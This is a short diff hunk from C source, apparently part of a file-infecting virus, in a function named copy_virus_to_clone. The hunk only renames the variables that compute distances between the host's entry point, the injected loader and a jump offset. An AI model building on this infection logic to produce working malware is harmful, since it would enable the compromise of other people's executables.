@@ -23,8 +23,8 @@ bool		copy_virus_to_clone(struct safe_ptr clone_ref,
 	const size_t	client_entry_off = shoff + file_entry->offset_in_section;
 
 	// compute distances
-	const size_t	dist_client_loader_entry = loader_entry_off - client_entry_off;
-	const size_t	dist_client_entry_jump   = dist_client_loader_entry + vhdr->dist_client_loader;
+	const size_t	dist_jmpclient_loader_entry = loader_entry_off - client_entry_off;
+	const size_t	dist_client_entry_jump      = dist_jmpclient_loader_entry + vhdr->dist_jmpclient_loader;
 
 	// compute code offsets
 	const size_t	client_jump_off = client_entry_off + dist_client_entry_jump;
